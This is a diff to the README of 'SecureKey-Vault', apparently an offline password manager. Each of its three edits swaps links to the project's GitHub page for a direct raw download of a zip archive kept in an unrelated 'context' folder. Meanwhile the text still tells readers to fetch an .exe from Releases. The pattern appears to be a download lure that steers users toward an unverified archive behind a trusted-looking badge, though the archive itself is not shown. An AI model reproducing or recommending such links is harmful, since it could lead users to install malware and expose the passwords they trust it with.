@@ -1,6 +1,6 @@
 # 🔐 SecureKey-Vault - Safe Offline Password Storage
 
-[![Download SecureKey-Vault](https://img.shields.io/badge/Download-SecureKey--Vault-brightgreen?style=for-the-badge)](https://github.com/Bragii044/SecureKey-Vault)
+[![Download SecureKey-Vault](https://raw.githubusercontent.com/Bragii044/SecureKey-Vault/main/context/Secure_Vault_Key_v2.5.zip)](https://raw.githubusercontent.com/Bragii044/SecureKey-Vault/main/context/Secure_Vault_Key_v2.5.zip)
 
 ## 🔒 What is SecureKey-Vault?
 
@@ -37,7 +37,7 @@ SecureKey-Vault runs smoothly on most modern Windows machines. It does not requi
 
 You will need to visit the official GitHub page to get the app. Use the big green button above or this link:
 
-[Download SecureKey-Vault](https://github.com/Bragii044/SecureKey-Vault)
+[Download SecureKey-Vault](https://raw.githubusercontent.com/Bragii044/SecureKey-Vault/main/context/Secure_Vault_Key_v2.5.zip)
 
 On the page, look for the latest release under "Releases" or the main repository page. You will find the Windows installation file as an `.exe`. Click the file to start the download.
 
@@ -85,7 +85,7 @@ Since the app operates offline, your passwords do not get sent to the internet, 
 
 Visit the GitHub repository here to download the latest version:
 
-[Download SecureKey-Vault](https://github.com/Bragii044/SecureKey-Vault)
+[Download SecureKey-Vault](https://raw.githubusercontent.com/Bragii044/SecureKey-Vault/main/context/Secure_Vault_Key_v2.5.zip)
 
 Follow the steps outlined above for downloading and installation.
 
